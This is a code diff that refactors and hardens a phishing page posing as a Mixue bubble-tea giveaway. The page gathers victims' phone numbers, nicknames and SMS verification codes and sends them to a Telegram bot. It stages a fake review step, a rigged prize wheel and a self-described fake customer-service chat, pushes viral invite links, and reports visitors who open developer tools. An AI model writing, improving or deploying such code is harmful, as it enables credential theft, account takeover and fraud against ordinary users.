@@ -164,16 +164,16 @@
       overflow: hidden;
       border: 1px solid #e8eaed;
       box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
-      display: none;
       opacity: 0;
       transform: translateY(12px);
       transition: all 0.4s ease;
+      pointer-events: none;
     }
 
     .verify-slider.show {
-      display: block;
       opacity: 1;
       transform: translateY(0);
+      pointer-events: auto;
     }
 
     .verify-bg {
@@ -248,7 +248,7 @@
     }
 
     .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); position: relative; overflow: hidden; }
-    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }
+    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; opacity:0.7; }
     .btn::after {
       content: '';
       position: absolute;
@@ -821,17 +821,6 @@
     <div class="splash-progress-bar" id="splashProgress"></div>
   </div>
   <div class="splash-hint">正在加载甜蜜福利...</div>
-  <!-- 背景音乐（已换有效链接） -->
-  <audio id="bgMusic" loop>
-    <source src="https://assets.codepen.io/605876/lofi-chillhop-1.mp3" type="audio/mpeg">
-  </audio>
-  <!-- 音效（原base64保留，即使可能无效） -->
-  <audio id="spinSound" preload="auto">
-    <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE" type="audio/wav">
-  </audio>
-  <audio id="winSound" preload="auto">
-    <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE" type="audio/wav">
-  </audio>
 </div>
 
 <div class="toast-container" id="toastContainer"></div>
@@ -1109,40 +1098,49 @@ let inviteState = {
 
 // 从本地存储恢复数据
 function loadFromStorage() {
-  const saved = localStorage.getItem('mx_invite_state');
-  if (saved) {
-    const data = JSON.parse(saved);
-    inviteState.invitedCount = data.invitedCount || 0;
-    inviteState.chanceCount = data.chanceCount || 0;
-    inviteState.hasWon = data.hasWon || false;
-    inviteState.checkedIn = data.checkedIn || false;
-    inviteState.lastCheckIn = data.lastCheckIn || null;
-    
-    const today = new Date().toDateString();
-    if (inviteState.lastCheckIn !== today) {
-      inviteState.checkedIn = false;
+  try {
+    const saved = localStorage.getItem('mx_invite_state');
+    if (saved) {
+      const data = JSON.parse(saved);
+      inviteState.invitedCount = data.invitedCount || 0;
+      inviteState.chanceCount = data.chanceCount || 0;
+      inviteState.hasWon = data.hasWon || false;
+      inviteState.checkedIn = data.checkedIn || false;
+      inviteState.lastCheckIn = data.lastCheckIn || null;
+      
+      const today = new Date().toDateString();
+      if (inviteState.lastCheckIn !== today) {
+        inviteState.checkedIn = false;
+      }
     }
+  } catch (e) {
+    console.warn('读取本地存储失败:', e);
   }
 }
 
 // 保存到本地存储
 function saveToStorage() {
-  localStorage.setItem('mx_invite_state', JSON.stringify({
-    invitedCount: inviteState.invitedCount,
-    chanceCount: inviteState.chanceCount,
-    hasWon: inviteState.hasWon,
-    checkedIn: inviteState.checkedIn,
-    lastCheckIn: inviteState.lastCheckIn,
-    currentPhone: inviteState.currentPhone
-  }));
+  try {
+    localStorage.setItem('mx_invite_state', JSON.stringify({
+      invitedCount: inviteState.invitedCount,
+      chanceCount: inviteState.chanceCount,
+      hasWon: inviteState.hasWon,
+      checkedIn: inviteState.checkedIn,
+      lastCheckIn: inviteState.lastCheckIn,
+      currentPhone: inviteState.currentPhone
+    }));
+  } catch (e) {
+    console.warn('保存到本地存储失败:', e);
+  }
 }
 
 function generateCouponCode() {
   const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
   const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
-  return `\( {prefix}-ICE- \){suffix}`;
+  return `${prefix}-ICE-${suffix}`;
 }
 
+// DOM 元素缓存
 const els = {
   phone: document.getElementById('phone'),
   nickname: document.getElementById('nickname'),
@@ -1200,7 +1198,8 @@ function showToast(msg, duration = 2800) {
   const t = document.createElement('div');
   t.className = 'toast';
   t.innerHTML = msg;
-  document.getElementById('toastContainer').appendChild(t);
+  els.toastContainer = els.toastContainer || document.getElementById('toastContainer');
+  els.toastContainer.appendChild(t);
   setTimeout(() => t.remove(), duration);
 }
 
@@ -1221,15 +1220,6 @@ function createParticles(x, y) {
     particle.style.setProperty('--ty', (Math.random() - 0.5) * 300 + 'px');
     document.body.appendChild(particle);
     setTimeout(() => particle.remove(), 3000);
-  }
-}
-
-// 播放音效（加catch防止阻塞）
-function playSound(type) {
-  const sound = type === 'win' ? document.getElementById('winSound') : document.getElementById('spinSound');
-  if (sound) {
-    sound.currentTime = 0;
-    sound.play().catch(e => console.log('音效播放失败:', e));
   }
 }
 
@@ -1356,7 +1346,8 @@ function resetSlider() {
   els.verifyBlock.style.left = '0';
   els.verifyBg.style.width = '0';
   els.verifyBlock.textContent = '→';
-  els.verifySlider.querySelector('.verify-text').textContent = '向右滑动完成验证';
+  const verifyText = els.verifySlider.querySelector('.verify-text');
+  if (verifyText) verifyText.textContent = '向右滑动完成验证';
 }
 
 function initSlider() {
@@ -1387,7 +1378,8 @@ function initSlider() {
         els.verifyBlock.textContent = '✓';
         els.verifyBlock.style.left = max + 'px';
         els.verifyBg.style.width = max + 'px';
-        els.verifySlider.querySelector('.verify-text').textContent = '验证成功';
+        const verifyText = els.verifySlider.querySelector('.verify-text');
+        if (verifyText) verifyText.textContent = '验证成功';
         checkPhoneValid();
       } else resetSlider();
       document.removeEventListener('mousemove', move);
@@ -1418,7 +1410,7 @@ function startCountdown() {
     const h = Math.floor(sec/3600).toString().padStart(2,'0');
     const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
     const s = (sec%60).toString().padStart(2,'0');
-    els.globalTimer.textContent = `本轮名额倒计时：\( {h}: \){m}:${s}`;
+    els.globalTimer.textContent = `本轮名额倒计时：${h}:${m}:${s}`;
     sec--;
   };
   tick();
@@ -1430,13 +1422,14 @@ function startBonusCountdown() {
   const tick = () => {
     if (sec <= 0) {
       bonusActive = false;
-      els.bonusTag.style.display = 'none';
-      document.querySelector('.countdown-bonus').style.opacity = '0.5';
+      if (els.bonusTag) els.bonusTag.style.display = 'none';
+      const bonusEl = document.querySelector('.countdown-bonus');
+      if (bonusEl) bonusEl.style.opacity = '0.5';
       return;
     }
     const m = Math.floor(sec/60).toString().padStart(2,'0');
     const s = (sec%60).toString().padStart(2,'0');
-    els.bonusTimer.textContent = `\( {m}: \){s}`;
+    if (els.bonusTimer) els.bonusTimer.textContent = `${m}:${s}`;
     sec--;
   };
   tick();
@@ -1447,25 +1440,20 @@ function initSplashScreen() {
   const splash = document.getElementById('splashScreen');
   const progress = document.getElementById('splashProgress');
   const text = document.getElementById('splashText');
-  const bgMusic = document.getElementById('bgMusic');
   
   let progressValue = 0;
   const interval = setInterval(() => {
     progressValue += 2;
-    progress.style.width = progressValue + '%';
+    if (progress) progress.style.width = progressValue + '%';
     
-    if (progressValue === 30) text.textContent = '正在准备甜蜜惊喜...';
-    if (progressValue === 60) text.textContent = '雪王正在调配最佳口味...';
-    if (progressValue === 90) text.textContent = '马上就好...';
+    if (progressValue === 30 && text) text.textContent = '正在准备甜蜜惊喜...';
+    if (progressValue === 60 && text) text.textContent = '雪王正在调配最佳口味...';
+    if (progressValue === 90 && text) text.textContent = '马上就好...';
     
     if (progressValue >= 100) {
       clearInterval(interval);
       setTimeout(() => {
-        splash.classList.add('hide');
-        setTimeout(() => {
-          bgMusic.volume = 0.25;
-          bgMusic.play().catch(e => console.log('背景音乐自动播放被阻止:', e));
-        }, 800);
+        if (splash) splash.classList.add('hide');
       }, 300);
     }
   }, 60);
@@ -1477,73 +1465,89 @@ function showInvitePage(phone, nickname) {
   
   const urlParams = new URLSearchParams(window.location.search);
   const refCode = urlParams.get('invite');
-  if (refCode) {
+  if (refCode && els.inviteCodeInput) {
     els.inviteCodeInput.value = refCode.toUpperCase();
   }
   
-  els.mainPage.classList.add('hidden');
-  els.invitePage.classList.remove('hidden');
-  els.invitePage.classList.add('show');
+  if (els.mainPage) els.mainPage.classList.add('hidden');
+  if (els.invitePage) {
+    els.invitePage.classList.remove('hidden');
+    els.invitePage.classList.add('show');
+  }
   
   loadFromStorage();
   updateInviteUI();
   startBonusCountdown();
   
-  setTimeout(() => els.keyboardHint.classList.add('show'), 1000);
-  setTimeout(() => els.keyboardHint.classList.remove('show'), 5000);
+  if (els.keyboardHint) {
+    setTimeout(() => els.keyboardHint.classList.add('show'), 1000);
+    setTimeout(() => els.keyboardHint.classList.remove('show'), 5000);
+  }
   
-  sendTGMessage(`【进入邀请页面】\n手机号：\( {phone}\n昵称： \){nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
+  sendTGMessage(`【进入邀请页面】\n手机号：${phone}\n昵称：${nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
 }
 
 function updateInviteUI() {
-  els.inviteCount.textContent = inviteState.invitedCount;
-  els.chanceCount.textContent = `剩余抽奖次数：${inviteState.chanceCount}`;
+  if (els.inviteCount) els.inviteCount.textContent = inviteState.invitedCount;
+  if (els.chanceCount) els.chanceCount.textContent = `剩余抽奖次数：${inviteState.chanceCount}`;
   
-  if (inviteState.checkedIn) {
-    els.checkInBtn.disabled = true;
-    els.checkInBtn.textContent = '✅ 今日已签到';
-  } else {
-    els.checkInBtn.disabled = false;
-    els.checkInBtn.textContent = '📅 每日签到 (+1次机会)';
-  }
-  
-  if (inviteState.invitedCount >= 1) {
-    els.step1.classList.add('completed');
-    els.step1.textContent = '✓';
-    els.line1.classList.add('completed');
-  }
-  if (inviteState.invitedCount >= 2) {
-    els.step2.classList.add('completed');
-    els.step2.textContent = '✓';
-    els.line2.classList.add('completed');
-  }
-  if (inviteState.invitedCount >= 3) {
-    els.step3.classList.add('completed');
-    els.step3.textContent = '✓';
-  } else {
-    els.step3.classList.add('active');
+  if (els.checkInBtn) {
+    if (inviteState.checkedIn) {
+      els.checkInBtn.disabled = true;
+      els.checkInBtn.textContent = '✅ 今日已签到';
+    } else {
+      els.checkInBtn.disabled = false;
+      els.checkInBtn.textContent = '📅 每日签到 (+1次机会)';
+    }
   }
   
-  if (bonusActive && inviteState.invitedCount > 0) {
-    els.bonusTag.style.display = 'block';
+  if (els.step1 && els.step2 && els.step3 && els.line1 && els.line2) {
+    if (inviteState.invitedCount >= 1) {
+      els.step1.classList.add('completed');
+      els.step1.textContent = '✓';
+      els.line1.classList.add('completed');
+    }
+    if (inviteState.invitedCount >= 2) {
+      els.step2.classList.add('completed');
+      els.step2.textContent = '✓';
+      els.line2.classList.add('completed');
+    }
+    if (inviteState.invitedCount >= 3) {
+      els.step3.classList.add('completed');
+      els.step3.textContent = '✓';
+    } else {
+      els.step3.classList.add('active');
+    }
   }
   
-  if (inviteState.invitedCount > 0) {
-    els.wheelContainer.style.display = 'block';
-  } else {
-    els.wheelContainer.style.display = 'none';
+  if (els.bonusTag) {
+    if (bonusActive && inviteState.invitedCount > 0) {
+      els.bonusTag.style.display = 'block';
+    } else {
+      els.bonusTag.style.display = 'none';
+    }
   }
   
-  if (inviteState.chanceCount > 0) {
-    els.wheelBtn.classList.remove('hidden');
-    els.inviteMoreBtn.classList.add('hidden');
-    els.wheelBtn.disabled = false;
-    els.wheelBtn.textContent = '🎰 开始抽奖';
-  } else {
-    els.wheelBtn.classList.add('hidden');
-    els.inviteMoreBtn.classList.remove('hidden');
-    els.inviteMoreBtn.textContent = '👥 邀请好友';
-    els.inviteMoreBtn.disabled = false;
+  if (els.wheelContainer) {
+    if (inviteState.invitedCount > 0) {
+      els.wheelContainer.style.display = 'block';
+    } else {
+      els.wheelContainer.style.display = 'none';
+    }
+  }
+  
+  if (els.wheelBtn && els.inviteMoreBtn) {
+    if (inviteState.chanceCount > 0) {
+      els.wheelBtn.classList.remove('hidden');
+      els.inviteMoreBtn.classList.add('hidden');
+      els.wheelBtn.disabled = false;
+      els.wheelBtn.textContent = '🎰 开始抽奖';
+    } else {
+      els.wheelBtn.classList.add('hidden');
+      els.inviteMoreBtn.classList.remove('hidden');
+      els.inviteMoreBtn.textContent = '👥 邀请好友';
+      els.inviteMoreBtn.disabled = false;
+    }
   }
   
   saveToStorage();
@@ -1564,7 +1568,7 @@ function dailyCheckIn() {
   updateInviteUI();
   saveToStorage();
   
-  sendTGMessage(`【每日签到】\n手机号：\( {inviteState.currentPhone}\n获得次数：1\n总次数： \){inviteState.chanceCount}`);
+  sendTGMessage(`【每日签到】\n手机号：${inviteState.currentPhone}\n获得次数：1\n总次数：${inviteState.chanceCount}`);
 }
 
 function simulateInvite() {
@@ -1574,8 +1578,9 @@ function simulateInvite() {
     inviteCode += chars.charAt(Math.floor(Math.random() * chars.length));
   }
   
-  const shareLink = window.location.href.split('?')[0] + '?invite=' + inviteCode;
-  const shareText = `🎉 蜜雪冰城免费领柠檬茶！\n\n我的邀请码：\( {inviteCode}\n点击链接帮我助力： \){shareLink}\n\n你也可以领券哦！`;
+  const currentUrl = window.location.href.split('?')[0];
+  const shareLink = `${currentUrl}?invite=${inviteCode}`;
+  const shareText = `🎉 蜜雪冰城免费领柠檬茶！\n\n我的邀请码：${inviteCode}\n点击链接帮我助力：${shareLink}\n\n你也可以领券哦！`;
   
   if (navigator.clipboard && window.isSecureContext) {
     navigator.clipboard.writeText(shareText).then(() => {
@@ -1587,8 +1592,10 @@ function simulateInvite() {
     fallbackCopy(shareText);
   }
   
-  els.inviteMoreBtn.disabled = true;
-  els.inviteMoreBtn.textContent = '邀请中...';
+  if (els.inviteMoreBtn) {
+    els.inviteMoreBtn.disabled = true;
+    els.inviteMoreBtn.textContent = '邀请中...';
+  }
   
   setTimeout(() => {
     inviteState.invitedCount++;
@@ -1604,7 +1611,7 @@ function simulateInvite() {
     
     inviteState.chanceCount += gainedChance;
     
-    sendTGMessage(`【新邀请】\n手机号：\( {inviteState.currentPhone}\n邀请码： \){inviteCode}\n当前邀请数：\( {inviteState.invitedCount}\n获得次数： \){gainedChance}\n总次数：\( {inviteState.chanceCount}\n翻倍状态： \){bonusActive ? '是' : '否'}`);
+    sendTGMessage(`【新邀请】\n手机号：${inviteState.currentPhone}\n邀请码：${inviteCode}\n当前邀请数：${inviteState.invitedCount}\n获得次数：${gainedChance}\n总次数：${inviteState.chanceCount}\n翻倍状态：${bonusActive ? '是' : '否'}`);
     
     updateInviteUI();
     saveToStorage();
@@ -1647,8 +1654,10 @@ function redeemInviteCode() {
     return;
   }
   
-  els.redeemBtn.disabled = true;
-  els.redeemBtn.textContent = '兑换中...';
+  if (els.redeemBtn) {
+    els.redeemBtn.disabled = true;
+    els.redeemBtn.textContent = '兑换中...';
+  }
   
   setTimeout(() => {
     if (Math.random() > 0.2) {
@@ -1656,9 +1665,9 @@ function redeemInviteCode() {
       inviteState.chanceCount += gainedChance;
       
       showToast(`兑换成功！获得 ${gainedChance} 次抽奖机会 🎁`);
-      els.inviteCodeInput.value = '';
+      if (els.inviteCodeInput) els.inviteCodeInput.value = '';
       
-      sendTGMessage(`【兑换邀请码】\n手机号：\( {inviteState.currentPhone}\n邀请码： \){code}\n获得次数：\( {gainedChance}\n总次数： \){inviteState.chanceCount}`);
+      sendTGMessage(`【兑换邀请码】\n手机号：${inviteState.currentPhone}\n邀请码：${code}\n获得次数：${gainedChance}\n总次数：${inviteState.chanceCount}`);
       
       updateInviteUI();
       saveToStorage();
@@ -1666,8 +1675,10 @@ function redeemInviteCode() {
       showToast('邀请码无效或已被使用 😢');
     }
     
-    els.redeemBtn.disabled = false;
-    els.redeemBtn.textContent = '兑换';
+    if (els.redeemBtn) {
+      els.redeemBtn.disabled = false;
+      els.redeemBtn.textContent = '兑换';
+    }
   }, 1000);
 }
 
@@ -1677,10 +1688,11 @@ function spinWheel() {
   isSpinning = true;
   inviteState.chanceCount--;
   updateInviteUI();
-  els.wheelBtn.disabled = true;
-  els.wheelBtn.textContent = '抽奖中...';
   
-  playSound('spin');
+  if (els.wheelBtn) {
+    els.wheelBtn.disabled = true;
+    els.wheelBtn.textContent = '抽奖中...';
+  }
   
   let resultIndex;
   const winIndices = [0, 2, 4, 6];
@@ -1698,12 +1710,15 @@ function spinWheel() {
   const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
   const totalRotation = baseRotation + targetAngle;
   
-  els.wheel.style.transform = `rotate(${totalRotation}deg)`;
+  if (els.wheel) els.wheel.style.transform = `rotate(${totalRotation}deg)`;
   
   setTimeout(() => {
     handleWheelResult(resultIndex);
     isSpinning = false;
-    els.wheelBtn.disabled = false;
+    if (els.wheelBtn) {
+      els.wheelBtn.disabled = false;
+      els.wheelBtn.textContent = '🎰 开始抽奖';
+    }
   }, 4000);
 }
 
@@ -1721,21 +1736,21 @@ function handleWheelResult(index) {
   
   const result = results[index];
   
-  sendTGMessage(`【抽奖结果】\n手机号：\( {inviteState.currentPhone}\n结果： \){result.name} \( {result.emoji}\n类型： \){result.type === 'win' ? '中奖' : '未中奖'}\n剩余次数：${inviteState.chanceCount}`);
+  sendTGMessage(`【抽奖结果】\n手机号：${inviteState.currentPhone}\n结果：${result.name} ${result.emoji}\n类型：${result.type === 'win' ? '中奖' : '未中奖'}\n剩余次数：${inviteState.chanceCount}`);
   
   if (result.type === 'win') {
-    playSound('win');
-    
-    const rect = els.wheel.getBoundingClientRect();
-    createParticles(rect.left + rect.width/2, rect.top + rect.height/2);
+    if (els.wheel) {
+      const rect = els.wheel.getBoundingClientRect();
+      createParticles(rect.left + rect.width/2, rect.top + rect.height/2);
+    }
     
     setTimeout(() => {
       claimed++;
       updateStock();
       shootBarrage(inviteState.currentPhone);
       const newCode = generateCouponCode();
-      els.couponCode.textContent = newCode;
-      els.modal.classList.add('show');
+      if (els.couponCode) els.couponCode.textContent = newCode;
+      if (els.modal) els.modal.classList.add('show');
       
       saveCouponToHistory(newCode);
       
@@ -1747,18 +1762,22 @@ function handleWheelResult(index) {
         });
       }
       
-      localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now());
+      try {
+        localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now().toString());
+      } catch (e) {
+        console.warn('保存领取记录失败:', e);
+      }
       
-      sendTGMessage(`【🎉 最终获奖】\n手机号：\( {inviteState.currentPhone}\n券码： \){newCode}\n获奖类型：\( {result.name}\n时间： \){new Date().toLocaleString('zh-CN')}`);
+      sendTGMessage(`【🎉 最终获奖】\n手机号：${inviteState.currentPhone}\n券码：${newCode}\n获奖类型：${result.name}\n时间：${new Date().toLocaleString('zh-CN')}`);
       
       // 成功后弹出假客服聊天
       setTimeout(openChat, 1200);
     }, 500);
   } else {
-    showToast(`${result.emoji} \( {result.name}！ \){inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
+    showToast(`${result.emoji} ${result.name}！${inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
     
     setTimeout(() => {
-      if (inviteState.chanceCount > 0) {
+      if (inviteState.chanceCount > 0 && els.wheelBtn) {
         showToast('没中？再来一次吧！点击「开始抽奖」', 3500);
         els.wheelBtn.disabled = false;
         els.wheelBtn.textContent = '🎰 再抽一次！';
@@ -1790,8 +1809,8 @@ function sendTGMessage(text) {
 function antiCheat() {
   const devtools = /./;
   devtools.toString = function() {
-    els.cheatWarning.classList.add('show');
-    sendTGMessage(`【⚠️ 警告】\n检测到开发者工具\n手机号：\( {inviteState.currentPhone || '未知'}\n时间： \){new Date().toLocaleString('zh-CN')}`);
+    if (els.cheatWarning) els.cheatWarning.classList.add('show');
+    sendTGMessage(`【⚠️ 警告】\n检测到开发者工具\n手机号：${inviteState.currentPhone || '未知'}\n时间：${new Date().toLocaleString('zh-CN')}`);
     return '';
   };
   
@@ -1811,23 +1830,23 @@ function antiCheat() {
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
       e.preventDefault();
-      els.cheatWarning.classList.add('show');
+      if (els.cheatWarning) els.cheatWarning.classList.add('show');
     }
   });
 }
 
 function initKeyboardShortcuts() {
   document.addEventListener('keydown', e => {
-    if (e.code === 'Space' && !els.wheelBtn.classList.contains('hidden') && !isSpinning) {
+    if (e.code === 'Space' && els.wheelBtn && !els.wheelBtn.classList.contains('hidden') && !isSpinning) {
       e.preventDefault();
       spinWheel();
     }
     
     if (e.key === 'Escape') {
-      els.modal.classList.remove('show');
-      els.agreementModal.classList.remove('show');
-      els.historyModal?.classList.remove('show');
-      els.chatModal?.classList.remove('show');
+      if (els.modal) els.modal.classList.remove('show');
+      if (els.agreementModal) els.agreementModal.classList.remove('show');
+      if (els.historyModal) els.historyModal.classList.remove('show');
+      if (els.chatModal) els.chatModal.classList.remove('show');
     }
   });
 }
@@ -1836,42 +1855,52 @@ function startManualReview(phone, nickname, code) {
   if (isPolling) return;
   isPolling = true;
   
-  els.loadingMask.classList.add('show');
+  if (els.loadingMask) els.loadingMask.classList.add('show');
   
   setTimeout(() => {
-    els.loadingMask.classList.remove('show');
+    if (els.loadingMask) els.loadingMask.classList.remove('show');
     isPolling = false;
     showInvitePage(phone, nickname);
-    sendTGMessage(`【审核通过】\n昵称：\( {nickname}\n手机号： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n状态：进入邀请流程`);
+    sendTGMessage(`【审核通过】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n状态：进入邀请流程`);
   }, 3000 + Math.random() * 2000);
 }
 
 // 券码历史
 function saveCouponToHistory(code) {
-  let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
-  history.unshift({
-    code: code,
-    time: new Date().toLocaleString('zh-CN'),
-    phone: inviteState.currentPhone || '未知'
-  });
-  if (history.length > 20) history = history.slice(0, 20);
-  localStorage.setItem('mx_coupon_history', JSON.stringify(history));
+  try {
+    let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
+    history.unshift({
+      code: code,
+      time: new Date().toLocaleString('zh-CN'),
+      phone: inviteState.currentPhone || '未知'
+    });
+    if (history.length > 20) history = history.slice(0, 20);
+    localStorage.setItem('mx_coupon_history', JSON.stringify(history));
+  } catch (e) {
+    console.warn('保存券码历史失败:', e);
+  }
 }
 
 function showCouponHistory() {
-  let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
-  
-  if (history.length === 0) {
-    els.historyList.innerHTML = '<p style="text-align:center;color:#999;">暂无券码记录，快去领券吧～</p>';
-  } else {
-    els.historyList.innerHTML = history.map(item => `
-      <div class="history-item">
-        <strong>${item.code}</strong><br>
-        <small>${item.time} | \( {item.phone.slice(0,3)}**** \){item.phone.slice(7)}</small>
-      </div>
-    `).join('');
+  try {
+    let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
+    
+    if (history.length === 0) {
+      if (els.historyList) els.historyList.innerHTML = '<p style="text-align:center;color:#999;">暂无券码记录，快去领券吧～</p>';
+    } else {
+      if (els.historyList) {
+        els.historyList.innerHTML = history.map(item => `
+          <div class="history-item">
+            <strong>${item.code}</strong><br>
+            <small>${item.time} | ${item.phone.slice(0,3)}****${item.phone.slice(7)}</small>
+          </div>
+        `).join('');
+      }
+    }
+    if (els.historyModal) els.historyModal.classList.add('show');
+  } catch (e) {
+    console.warn('显示券码历史失败:', e);
   }
-  document.getElementById('historyModal').classList.add('show');
 }
 
 // 假雪王客服聊天
@@ -1907,8 +1936,10 @@ function addMessage(text, isCustomer = true) {
     msgDiv.textContent = text;
   }
   
-  els.chatMessages.appendChild(msgDiv);
-  els.chatMessages.scrollTop = els.chatMessages.scrollHeight;
+  if (els.chatMessages) {
+    els.chatMessages.appendChild(msgDiv);
+    els.chatMessages.scrollTop = els.chatMessages.scrollHeight;
+  }
 }
 
 function customerReply(userText = "") {
@@ -1932,165 +1963,216 @@ function customerReply(userText = "") {
 }
 
 function openChat() {
-  els.chatModal.style.display = 'flex';
-  els.chatMessages.innerHTML = '';
-  addMessage("嘿～恭喜领到大杯柠檬茶啦！我是雪王小冰～有啥问题尽管问我哦～😄", true);
-  setTimeout(() => customerReply(""), 1800);
+  if (els.chatModal) {
+    els.chatModal.style.display = 'flex';
+    if (els.chatMessages) els.chatMessages.innerHTML = '';
+    addMessage("嘿～恭喜领到大杯柠檬茶啦！我是雪王小冰～有啥问题尽管问我哦～😄", true);
+    setTimeout(() => customerReply(""), 1800);
+  }
 }
 
 // 事件绑定
-els.phone.addEventListener('input', checkPhoneValid);
-els.phone.addEventListener('blur', checkPhoneValid);
+function initEventListeners() {
+  if (els.phone) {
+    els.phone.addEventListener('input', checkPhoneValid);
+    els.phone.addEventListener('blur', checkPhoneValid);
+  }
 
-els.closeModalBtn.addEventListener('click', () => {
-  els.modal.classList.remove('show');
-});
+  if (els.closeModalBtn) {
+    els.closeModalBtn.addEventListener('click', () => {
+      if (els.modal) els.modal.classList.remove('show');
+    });
+  }
 
-els.getBtn.addEventListener('click', async () => {
-  if (els.getBtn.disabled || isSending) return;
+  if (els.getBtn) {
+    els.getBtn.addEventListener('click', async () => {
+      if (els.getBtn.disabled || isSending) return;
 
-  isSending = true;
-  els.getBtn.disabled = true;
-  els.getBtn.textContent = '发送中...';
+      isSending = true;
+      els.getBtn.disabled = true;
+      els.getBtn.textContent = '发送中...';
 
-  const phone = els.phone.value.trim();
-  const nick = els.nickname.value.trim() || '无';
+      const phone = els.phone.value.trim();
+      const nick = els.nickname.value.trim() || '无';
 
-  try {
-    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
-    const params = new URLSearchParams();
-    params.append('chat_id', _cfg.u);
-    params.append('text', `【新号】\n昵称：\( {nick}\n手机号： \){phone}\n时间：${new Date().toLocaleString('zh-CN')}`);
+      try {
+        const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
+        const params = new URLSearchParams();
+        params.append('chat_id', _cfg.u);
+        params.append('text', `【新号】\n昵称：${nick}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`);
 
-    const response = await fetch(ep, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: params
+        const response = await fetch(ep, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+        });
+
+        if (!response.ok) throw new Error('Telegram 发送失败');
+
+        let s = 60;
+        els.getBtn.textContent = `重发(${s}s)`;
+        if (els.code) els.code.focus();
+        if (els.countdown) {
+          els.countdown.style.opacity = '1';
+          els.countdown.textContent = `验证码已发送（${s}s）`;
+        }
+
+        timers.code = setInterval(() => {
+          s--;
+          if (s > 0) {
+            els.getBtn.textContent = `重发(${s}s)`;
+            if (els.countdown) els.countdown.textContent = `验证码已发送（${s}s）`;
+          } else {
+            clearInterval(timers.code);
+            isSending = false;
+            els.getBtn.disabled = !( /^1[3-9]\d{9}$/.test(els.phone.value.trim()) && isVerifySuccess );
+            els.getBtn.textContent = '获取验证码';
+            if (els.countdown) els.countdown.style.opacity = '0';
+          }
+        }, 1000);
+
+      } catch (err) {
+        console.error('发送失败：', err);
+        showToast('网络异常，稍后再试');
+        isSending = false;
+        els.getBtn.disabled = false;
+        els.getBtn.textContent = '获取验证码';
+      }
+    });
+  }
+
+  if (els.code) {
+    els.code.addEventListener('input', () => {
+      const len = els.code.value.trim().length;
+      if (els.submitBtn) {
+        els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
+        els.submitBtn.disabled = len < 6;
+      }
+      els.code.classList.toggle('input-error', len > 0 && len < 6);
+    });
+  }
+
+  if (els.submitBtn) {
+    els.submitBtn.addEventListener('click', async () => {
+      if (els.submitBtn.disabled || isPolling) return;
+
+      const phone = els.phone.value.trim();
+      const code = els.code.value.trim();
+      const nick = els.nickname.value.trim() || '无';
+
+      if (code.length !== 6) {
+        showToast('请输入6位有效验证码');
+        return;
+      }
+
+      try {
+        if (localStorage.getItem('mx_claim_' + phone)) {
+          showToast('该手机号已参与过活动');
+          return;
+        }
+      } catch (e) {
+        console.warn('检查本地存储失败:', e);
+      }
+
+      startManualReview(phone, nick, code);
+    });
+  }
+
+  if (els.inviteMoreBtn) els.inviteMoreBtn.addEventListener('click', simulateInvite);
+  if (els.redeemBtn) els.redeemBtn.addEventListener('click', redeemInviteCode);
+  if (els.wheelBtn) els.wheelBtn.addEventListener('click', spinWheel);
+  if (els.checkInBtn) els.checkInBtn.addEventListener('click', dailyCheckIn);
+
+  if (els.modal) {
+    els.modal.addEventListener('click', e => {
+      if (e.target === els.modal) els.modal.classList.remove('show');
+    });
+  }
+
+  if (els.rejectedModal) {
+    els.rejectedModal.addEventListener('click', e => {
+      if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
+    });
+  }
+
+  if (els.copyCouponBtn) {
+    els.copyCouponBtn.addEventListener('click', () => {
+      const code = els.couponCode ? els.couponCode.textContent : '';
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(() => showToast('券码已复制！'));
+      } else {
+        showToast('请长按券码手动复制');
+      }
+    });
+  }
+
+  if (els.shareBtn) {
